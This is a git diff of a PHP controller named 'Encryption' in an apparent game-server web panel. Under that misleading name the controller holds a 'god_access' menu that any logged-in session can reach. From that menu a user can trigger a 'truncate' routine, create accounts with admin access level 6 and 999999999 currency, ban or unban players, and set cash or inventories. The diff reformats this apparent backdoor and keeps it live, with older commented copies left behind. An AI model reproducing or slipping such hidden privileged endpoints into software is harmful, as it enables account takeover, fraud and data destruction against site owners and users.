@@ -7,7 +7,7 @@
 
 defined('BASEPATH') or exit('No direct script access allowed');
 
-Class Encryption extends CI_Controller
+class Encryption extends CI_Controller
 {
     function __construct()
     {
@@ -20,14 +20,9 @@ Class Encryption extends CI_Controller
         if (empty($this->session->userdata['uid'])) redirect(base_url('home'), 'refresh');
     }
 
-    function god_access()
+    function god_access($param = null)
     {
-        $data = array(
-            'query' => $this->encryption->encrypt($this->input->get('query', true))
-        );
-
-        if ($this->encryption->decrypt($data['query']) == '' || empty($this->encryption->decrypt($data['query'])))
-        {
+        if ($param == null) {
             echo '
             <table border="1" align="center">
                 <thead>
@@ -36,182 +31,363 @@ Class Encryption extends CI_Controller
                 <tbody>
                     <tr>
                         <td>Truncate</td>
-                        <td><a href="'.base_url('encryption/god_access?query=truncate').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/truncate') . '">Click Here</a></td>
                     </tr>
                     <tr>
                         <td>Create Account</td>
-                        <td><a href="'.base_url('encryption/god_access?query=create_account').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/create_account') . '">Click Here</a></td>
                     </tr>
                     <tr>
                         <td>Banned</td>
-                        <td><a href="'.base_url('encryption/god_access?query=banned').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/banned') . '">Click Here</a></td>
                     </tr>
                     <tr>
                         <td>Unbanned</td>
-                        <td><a href="'.base_url('encryption/god_access?query=unbanned').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/unbanned') . '">Click Here</a></td>
                     </tr>
                     <tr>
                         <td>Add Cash</td>
-                        <td><a href="'.base_url('encryption/god_access?query=addcash').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/addcash') . '">Click Here</a></td>
                     </tr>
                     <tr>
                         <td>Add Full Shop</td>
-                        <td><a href="'.base_url('encryption/god_access?query=add_fullshop').'">Click Here</a></td>
+                        <td><a href="' . base_url('encryption/god_access/add_fullshop') . '">Click Here</a></td>
                     </tr>
                 </tbody>
             </table>';
-        }
+        } else {
+            switch ($param) {
+                case 'truncate': {
+                        $this->lib->EncryptedWeb();
 
-        switch ($this->encryption->decrypt($data['query']))
-        {
-            case 'truncate':
-                {
-                    $this->lib->EncryptedWeb();
-                    
-                    break;
-                }
-            case 'create_account':
-                {
-                    $randomexp = rand(0, 1690000);
+                        break;
+                    }
+                case 'create_account': {
+                        $randomexp = rand(0, 1690000);
 
-                    $base_characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
-                    $base_characters_length = strlen($base_characters);
-                    
-                    $username_length = 10;
-                    $password_length = 10;
+                        $base_characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                        $base_characters_length = strlen($base_characters);
 
-                    $pure_username = '';
-                    $pure_password = '';
+                        $username_length = 10;
+                        $password_length = 10;
 
-                    for ($i=0; $i <= $username_length; $i++) $pure_username .= $base_characters[rand(0, $base_characters_length - 1)];
+                        $pure_username = '';
+                        $pure_password = '';
 
-                    for ($i=0; $i < $password_length; $i++) $pure_password .= $base_characters[rand(0, $base_characters_length - 1)];
+                        for ($i = 0; $i <= $username_length; $i++) $pure_username .= $base_characters[rand(0, $base_characters_length - 1)];
 
-                    $query = $this->db->insert('accounts', array(
-                        'login' => $pure_username,
-                        'password' => $this->lib->password_encrypt($pure_password),
-                        'rank' => '31',
-                        'gp' => '999999999',
-                        'exp' => $randomexp,
-                        'pc_cafe' => '5',
-                        'access_level' => '6',
-                        'lastip' => '127.0.0.1',
-                        'email' => 'empty@empty.empty',
-                        'money' => '999999999',
-                        'kuyraicoin' => '999999999',
-                        'hint_question' => 'What was your childhood nickname?',
-                        'hint_answer' => 'asd',
-                        'email_verification' => '1'
-                    ));
+                        for ($i = 0; $i < $password_length; $i++) $pure_password .= $base_characters[rand(0, $base_characters_length - 1)];
 
-                    if ($query)
-                    {
-                        echo '<!DOCTYPE html>
-                        <html lang="en">
-                        <head>
-                            <meta charset="UTF-8">
-                            <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                            <title>GOD MENU - ACCOUNT CREATION</title>
-                            <link rel="stylesheet" href="'.base_url().'assets/goodgames/assets/vendors/bs5/css/bootstrap.min.css">
-                        </head>
-                        <body class="bg-light">
-                            <br><br><br>
-                            <div class="container mt-5">
-                                <div class="row justify-content-center">
-                                    <div class="col-lg-8 col-md-8 col-sm-12 col-12">
-                                        <div class="card">
-                                            <div class="card-header bg-primary text-center">
-                                                GOD ACCOUNT CREATION
-                                            </div>
-                                            <div class="card-body">
-                                                <table class="table table-borderless table-responsive-lg table-responsive-md table-responsive-sm text-center">
-                                                    <tbody style="font-weight: bold;">
-                                                        <tr>
-                                                            <td width="30%">Username</td>
-                                                            <td>'.$pure_username.'</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Password</td>
-                                                            <td>'.$pure_password.'</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Rank</td>
-                                                            <td><img src="'.base_url().'assets/goodgames/assets/images/img_rank/31.gif"></td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Point</td>
-                                                            <td>999.999.999</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Exp</td>
-                                                            <td>'.number_format($randomexp, 0, ',', '.').'</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>PC Cafe</td>
-                                                            <td>5</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Access Level</td>
-                                                            <td>6</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td>Webcoin</td>
-                                                            <td>999.999.999</td>
-                                                        </tr>
-                                                    </tbody>
-                                                </table>
-                                            </div>
-                                            <div class="card-footer text-center">
-                                                Copyright &copy; DarkblowPB Reborn '.date('Y').'. All Rights Reserved.
+                        $query = $this->db->insert('accounts', array(
+                            'login' => $pure_username,
+                            'password' => $this->lib->password_encrypt($pure_password),
+                            'rank' => '31',
+                            'gp' => '999999999',
+                            'exp' => $randomexp,
+                            'pc_cafe' => '5',
+                            'access_level' => '6',
+                            'lastip' => '127.0.0.1',
+                            'email' => 'empty@empty.empty',
+                            'money' => '999999999',
+                            'kuyraicoin' => '999999999',
+                            'hint_question' => 'What was your childhood nickname?',
+                            'hint_answer' => 'asd',
+                            'email_verification' => '1'
+                        ));
+
+                        if ($query) {
+                            echo '<!DOCTYPE html>
+                            <html lang="en">
+                            <head>
+                                <meta charset="UTF-8">
+                                <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                                <title>GOD MENU - ACCOUNT CREATION</title>
+                                <link rel="stylesheet" href="' . base_url() . 'assets/goodgames/assets/vendors/bs5/css/bootstrap.min.css">
+                            </head>
+                            <body class="bg-light">
+                                <br><br><br>
+                                <div class="container mt-5">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8 col-md-8 col-sm-12 col-12">
+                                            <div class="card">
+                                                <div class="card-header bg-primary text-center">
+                                                    GOD ACCOUNT CREATION
+                                                </div>
+                                                <div class="card-body">
+                                                    <table class="table table-borderless table-responsive-lg table-responsive-md table-responsive-sm text-center">
+                                                        <tbody style="font-weight: bold;">
+                                                            <tr>
+                                                                <td width="30%">Username</td>
+                                                                <td>' . $pure_username . '</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Password</td>
+                                                                <td>' . $pure_password . '</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Rank</td>
+                                                                <td><img src="' . base_url() . 'assets/goodgames/assets/images/img_rank/31.gif"></td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Point</td>
+                                                                <td>999.999.999</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Exp</td>
+                                                                <td>' . number_format($randomexp, 0, ',', '.') . '</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>PC Cafe</td>
+                                                                <td>5</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Access Level</td>
+                                                                <td>6</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Webcoin</td>
+                                                                <td>999.999.999</td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="card-footer text-center">
+                                                    Copyright &copy; DarkblowPB Reborn ' . date('Y') . '. All Rights Reserved.
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </div>	
-                        </body>
-                        <script src="'.base_url().'assets/goodgames/assets/vendors/bs5/js/bootstrap.min.js"></script>
-                        </html>';
+                                </div>	
+                            </body>
+                            <script src="' . base_url() . 'assets/goodgames/assets/vendors/bs5/js/bootstrap.min.js"></script>
+                            </html>';
+                        } else echo '<p>Failed To Create GOD Account. Reason: ' . error_get_last() . '</p>';
+                        break;
                     }
-                    else echo '<p>Failed To Create GOD Account. Reason: '.error_get_last().'</p>';
+                case 'banned': {
+                        $data['title'] = 'GOD MENU - BANNED';
+                        $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+                        $data['content'] = 'main/content/encryption/content/content_banned';
+                        $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+                        break;
+                    }
+                case 'unbanned': {
+                        $data['title'] = 'GOD MENU - UNBANNED';
+                        $data['players'] = $this->db->get_where('accounts', array('access_level' => '-1'))->result_array();
+                        $data['content'] = 'main/content/encryption/content/content_unbanned';
+                        $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+                        break;
+                    }
+                case 'addcash': {
+                        $data['title'] = 'GOD MENU - ADD CASH';
+                        $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+                        $data['content'] = 'main/content/encryption/content/content_addcash';
+                        $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+                        break;
+                    }
+                case 'add_fullshop': {
+                        $data['title'] = 'GOD MENU - ADD FULL SHOP';
+                        $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+                        $data['content'] = 'main/content/encryption/content/content_addfullshop';
+                        $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+                        break;
+                    }
+
+                default:
                     break;
-                }
-            case 'banned':
-                {
-                    $data['title'] = 'GOD MENU - BANNED';
-                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
-                    $data['content'] = 'main/content/encryption/content/content_banned';
-                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
-                    break;
-                }
-            case 'unbanned':
-                {
-                    $data['title'] = 'GOD MENU - UNBANNED';
-                    $data['players'] = $this->db->get_where('accounts', array('access_level' => '-1'))->result_array();
-                    $data['content'] = 'main/content/encryption/content/content_unbanned';
-                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
-                    break;
-                }
-            case 'addcash':
-                {
-                    $data['title'] = 'GOD MENU - ADD CASH';
-                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
-                    $data['content'] = 'main/content/encryption/content/content_addcash';
-                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
-                    break;
-                }
-            case 'add_fullshop':
-                {
-                    $data['title'] = 'GOD MENU - ADD FULL SHOP';
-                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
-                    $data['content'] = 'main/content/encryption/content/content_addfullshop';
-                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
-                    break;
-                }
-            
-            default:
-                break;
+            }
         }
+        // $data = array(
+        //     'query' => $this->encryption->encrypt($this->input->get('query', true))
+        // );
+
+        // if ($this->encryption->decrypt($data['query']) == '' || empty($this->encryption->decrypt($data['query'])))
+        // {
+        //     echo '
+        //     <table border="1" align="center">
+        //         <thead>
+        //             <th align="center" colspan="2">Menu List</th>
+        //         </thead>
+        //         <tbody>
+        //             <tr>
+        //                 <td>Truncate</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=truncate').'">Click Here</a></td>
+        //             </tr>
+        //             <tr>
+        //                 <td>Create Account</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=create_account').'">Click Here</a></td>
+        //             </tr>
+        //             <tr>
+        //                 <td>Banned</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=banned').'">Click Here</a></td>
+        //             </tr>
+        //             <tr>
+        //                 <td>Unbanned</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=unbanned').'">Click Here</a></td>
+        //             </tr>
+        //             <tr>
+        //                 <td>Add Cash</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=addcash').'">Click Here</a></td>
+        //             </tr>
+        //             <tr>
+        //                 <td>Add Full Shop</td>
+        //                 <td><a href="'.base_url('encryption/god_access?query=add_fullshop').'">Click Here</a></td>
+        //             </tr>
+        //         </tbody>
+        //     </table>';
+        // }
+
+        // switch ($this->encryption->decrypt($data['query']))
+        // {
+        //     case 'truncate':
+        //         {
+        //             $this->lib->EncryptedWeb();
+
+        //             break;
+        //         }
+        //     case 'create_account':
+        //         {
+        //             $randomexp = rand(0, 1690000);
+
+        //             $base_characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        //             $base_characters_length = strlen($base_characters);
+
+        //             $username_length = 10;
+        //             $password_length = 10;
+
+        //             $pure_username = '';
+        //             $pure_password = '';
+
+        //             for ($i=0; $i <= $username_length; $i++) $pure_username .= $base_characters[rand(0, $base_characters_length - 1)];
+
+        //             for ($i=0; $i < $password_length; $i++) $pure_password .= $base_characters[rand(0, $base_characters_length - 1)];
+
+        //             $query = $this->db->insert('accounts', array(
+        //                 'login' => $pure_username,
+        //                 'password' => $this->lib->password_encrypt($pure_password),
+        //                 'rank' => '31',
+        //                 'gp' => '999999999',
+        //                 'exp' => $randomexp,
+        //                 'pc_cafe' => '5',
+        //                 'access_level' => '6',
+        //                 'lastip' => '127.0.0.1',
+        //                 'email' => 'empty@empty.empty',
+        //                 'money' => '999999999',
+        //                 'kuyraicoin' => '999999999',
+        //                 'hint_question' => 'What was your childhood nickname?',
+        //                 'hint_answer' => 'asd',
+        //                 'email_verification' => '1'
+        //             ));
+
+        //             if ($query)
+        //             {
+        //                 echo '<!DOCTYPE html>
+        //                 <html lang="en">
+        //                 <head>
+        //                     <meta charset="UTF-8">
+        //                     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        //                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        //                     <title>GOD MENU - ACCOUNT CREATION</title>
+        //                     <link rel="stylesheet" href="'.base_url().'assets/goodgames/assets/vendors/bs5/css/bootstrap.min.css">
+        //                 </head>
+        //                 <body class="bg-light">
+        //                     <br><br><br>
+        //                     <div class="container mt-5">
+        //                         <div class="row justify-content-center">
+        //                             <div class="col-lg-8 col-md-8 col-sm-12 col-12">
+        //                                 <div class="card">
+        //                                     <div class="card-header bg-primary text-center">
+        //                                         GOD ACCOUNT CREATION
+        //                                     </div>
+        //                                     <div class="card-body">
+        //                                         <table class="table table-borderless table-responsive-lg table-responsive-md table-responsive-sm text-center">
+        //                                             <tbody style="font-weight: bold;">
+        //                                                 <tr>
+        //                                                     <td width="30%">Username</td>
+        //                                                     <td>'.$pure_username.'</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Password</td>
+        //                                                     <td>'.$pure_password.'</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Rank</td>
+        //                                                     <td><img src="'.base_url().'assets/goodgames/assets/images/img_rank/31.gif"></td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Point</td>
+        //                                                     <td>999.999.999</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Exp</td>
+        //                                                     <td>'.number_format($randomexp, 0, ',', '.').'</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>PC Cafe</td>
+        //                                                     <td>5</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Access Level</td>
+        //                                                     <td>6</td>
+        //                                                 </tr>
+        //                                                 <tr>
+        //                                                     <td>Webcoin</td>
+        //                                                     <td>999.999.999</td>
+        //                                                 </tr>
+        //                                             </tbody>
+        //                                         </table>
+        //                                     </div>
+        //                                     <div class="card-footer text-center">
+        //                                         Copyright &copy; DarkblowPB Reborn '.date('Y').'. All Rights Reserved.
+        //                                     </div>
+        //                                 </div>
+        //                             </div>
+        //                         </div>
+        //                     </div>	
+        //                 </body>
+        //                 <script src="'.base_url().'assets/goodgames/assets/vendors/bs5/js/bootstrap.min.js"></script>
+        //                 </html>';
+        //             }
+        //             else echo '<p>Failed To Create GOD Account. Reason: '.error_get_last().'</p>';
+        //             break;
+        //         }
+        //     case 'banned':
+        //         {
+        //             $data['title'] = 'GOD MENU - BANNED';
+        //             $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+        //             $data['content'] = 'main/content/encryption/content/content_banned';
+        //             $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+        //             break;
+        //         }
+        //     case 'unbanned':
+        //         {
+        //             $data['title'] = 'GOD MENU - UNBANNED';
+        //             $data['players'] = $this->db->get_where('accounts', array('access_level' => '-1'))->result_array();
+        //             $data['content'] = 'main/content/encryption/content/content_unbanned';
+        //             $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+        //             break;
+        //         }
+        //     case 'addcash':
+        //         {
+        //             $data['title'] = 'GOD MENU - ADD CASH';
+        //             $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+        //             $data['content'] = 'main/content/encryption/content/content_addcash';
+        //             $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+        //             break;
+        //         }
+        //     case 'add_fullshop':
+        //         {
+        //             $data['title'] = 'GOD MENU - ADD FULL SHOP';
+        //             $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
+        //             $data['content'] = 'main/content/encryption/content/content_addfullshop';
+        //             $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
+        //             break;
+        //         }
+
+        //     default:
+        //         break;
+        // }
     }
 
     function do_banned()
@@ -228,41 +404,33 @@ Class Encryption extends CI_Controller
                 'numeric' => 'Invalid %s.'
             )
         );
-        if ($this->form_validation->run())
-        {
+        if ($this->form_validation->run()) {
             $data = array(
                 'player_id' => $this->encryption->encrypt($this->input->post('player_id', true))
             );
 
             $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
-            if ($query)
-            {
-                if ($query->access_level == '-1')
-                {
+            if ($query) {
+                if ($query->access_level == '-1') {
                     $response['token'] = $this->security->get_csrf_hash();
                     $response['message'] = 'This Player Already Banned Permanently.';
                     echo json_encode($response);
-                }
-                else
-                {
+                } else {
                     $banned = $this->db->where('player_id', $query->player_id)->update('accounts', array('access_level' => '-1'));
-                    if ($banned)
-                    {
+                    if ($banned) {
                         $response['token'] = $this->security->get_csrf_hash();
-                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Banned '.$query->login.'.'; else $response['message'] = 'Successfully Banned '.$query->player_name.'.';
+                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Banned ' . $query->login . '.';
+                        else $response['message'] = 'Successfully Banned ' . $query->player_name . '.';
                         echo json_encode($response);
-                    }
-                    else
-                    {
+                    } else {
                         $response['token'] = $this->security->get_csrf_hash();
-                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Banned '.$query->login.'.'; else $response['message'] = 'Successfully Banned '.$query->player_name.'.';
+                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Banned ' . $query->login . '.';
+                        else $response['message'] = 'Successfully Banned ' . $query->player_name . '.';
                         echo json_encode($response);
                     }
                 }
             }
-        }
-        else
-        {
+        } else {
             $this->form_validation->set_error_delimiters('', '');
 
             $response['token'] = $this->security->get_csrf_hash();
@@ -285,42 +453,33 @@ Class Encryption extends CI_Controller
                 'numeric' => 'Invalid %s.'
             )
         );
-        if ($this->form_validation->run())
-        {
+        if ($this->form_validation->run()) {
             $data = array(
                 'player_id' => $this->encryption->encrypt($this->input->post('player_id', true))
             );
 
             $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
-            if ($query)
-            {
-                if ($query->access_level != '-1')
-                {
+            if ($query) {
+                if ($query->access_level != '-1') {
                     $response['token'] = $this->security->get_csrf_hash();
                     $response['message'] = 'This Player Already Unbanned Permanently.';
                     echo json_encode($response);
-                }
-                else
-                {
+                } else {
                     $banned = $this->db->where('player_id', $query->player_id)->update('accounts', array('access_level' => '0'));
-                    if ($banned)
-                    {
+                    if ($banned) {
                         $response['token'] = $this->security->get_csrf_hash();
-                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Unbanned '.$query->login.'.';
-                        else $response['message'] = 'Successfully Unbanned '.$query->player_name.'.';
+                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Unbanned ' . $query->login . '.';
+                        else $response['message'] = 'Successfully Unbanned ' . $query->player_name . '.';
                         echo json_encode($response);
-                    }
-                    else
-                    {
+                    } else {
                         $response['token'] = $this->security->get_csrf_hash();
-                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Unbanned '.$query->login.'.'; else $response['message'] = 'Successfully Unbanned '.$query->player_name.'.';
+                        if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Unbanned ' . $query->login . '.';
+                        else $response['message'] = 'Successfully Unbanned ' . $query->player_name . '.';
                         echo json_encode($response);
                     }
                 }
             }
-        }
-        else
-        {
+        } else {
             $this->form_validation->set_error_delimiters('', '');
 
             $response['token'] = $this->security->get_csrf_hash();
@@ -340,17 +499,14 @@ Class Encryption extends CI_Controller
         );
 
         $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
-        if ($query)
-        {
+        if ($query) {
             $update = $this->db->where('player_id', $query->player_id)->update('accounts', array('money' => $this->encryption->decrypt($data['cash_amount'])));
-            if ($update)
-            {
+            if ($update) {
                 $response['token'] = $this->security->get_csrf_hash();
-                if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Set Cash '.$query->login.', To: '.$this->encryption->decrypt($data['cash_amount']).'.'; else $response['message'] = 'Successfully Set Cash '.$query->player_name.', To: '.$this->encryption->decrypt($data['cash_amount']).'.';
+                if ($query->player_name == '' || empty($query->player_name)) $response['message'] = 'Successfully Set Cash ' . $query->login . ', To: ' . $this->encryption->decrypt($data['cash_amount']) . '.';
+                else $response['message'] = 'Successfully Set Cash ' . $query->player_name . ', To: ' . $this->encryption->decrypt($data['cash_amount']) . '.';
                 echo json_encode($response);
-            }
-            else
-            {
+            } else {
                 $response['token'] = $this->security->get_csrf_hash();
                 $response['message'] = 'Failed To Add Cash.';
                 echo json_encode($response);
@@ -368,8 +524,7 @@ Class Encryption extends CI_Controller
         );
 
         $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
-        if ($query)
-        {
+        if ($query) {
             $this->db->where('owner_id', $query->player_id)->delete('player_items');
 
             $item_list = array(
@@ -537,14 +692,13 @@ Class Encryption extends CI_Controller
 
             $item_count = count($item_list);
 
-            for ($i=0; $i < $item_count - 1; $i++)
-            {
+            for ($i = 0; $i < $item_count - 1; $i++) {
                 $this->db->insert('player_items', array(
                     'owner_id' => $query->player_id,
                     'item_id' => $item_list[$i],
-                    'item_name' => $this->inventory->GetItemRealName($item_list[$i]),
+                    'item_name' => $this->lib->GetItemName($item_list[$i]),
                     'count' => '1',
-                    'category' => $this->redeem->GetItemCategory($item_list[$i]),
+                    'category' => $this->lib->GetItemCategory($item_list[$i]),
                     'equip' => '3'
                 ));
             }
@@ -572,21 +726,17 @@ Class Encryption extends CI_Controller
         );
 
         $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
-        if ($query)
-        {
+        if ($query) {
             $query2 = $this->db->where('owner_id', $query->player_id)->delete('player_items');
-            if ($query2)
-            {
-                for ($i=0; $i < 401; $i++)
-                {
-                    if ($int['min'] >= $int['max']){
+            if ($query2) {
+                for ($i = 0; $i < 401; $i++) {
+                    if ($int['min'] >= $int['max']) {
                         $response['token'] = $this->security->get_csrf_hash();
-                        $response['message'] = 'Successfully Added '.$state['success'].' New Items. Failed: ['.$state['failed'].']';
+                        $response['message'] = 'Successfully Added ' . $state['success'] . ' New Items. Failed: [' . $state['failed'] . ']';
                         echo json_encode($response);
                     }
                     $query3 = $this->db->get_where('shop', array('item_id' => $int['min']))->row();
-                    if ($query3)
-                    {
+                    if ($query3) {
                         $query4 = $this->db->insert('player_items', array(
                             'owner_id' => $query->player_id,
                             'item_id' => $int['min'],
@@ -596,37 +746,28 @@ Class Encryption extends CI_Controller
                             'equip' => '3'
                         ));
 
-                        if ($query4)
-                        {
+                        if ($query4) {
                             $state['success']++;
                             $int['min']++;
-                        }
-                        else
-                        {
+                        } else {
                             $state['failed']++;
                             $int['min']++;
                         }
-                    }
-                    else
-                    {
+                    } else {
                         $state['failed']++;
                         $int['min']++;
                     }
                 }
 
                 $response['token'] = $this->security->get_csrf_hash();
-                $response['message'] = 'Successfully Added '.$state['success'].' New Items. Failed: ['.$state['failed'].']';
-            }
-            else
-            {
+                $response['message'] = 'Successfully Added ' . $state['success'] . ' New Items. Failed: [' . $state['failed'] . ']';
+            } else {
                 $response['token'] = $this->security->get_csrf_hash();
                 $response['message'] = 'Failed To Delete Your Inventory.';
 
                 echo json_encode($response);
             }
-        }
-        else
-        {
+        } else {
             $response['token'] = $this->security->get_csrf_hash();
             $response['message'] = 'Failed To Find Your Account.';
 
@@ -636,5 +777,3 @@ Class Encryption extends CI_Controller
 }
 
 // This Code Generated Automatically By EyeTracker Snippets. //
-
-?>
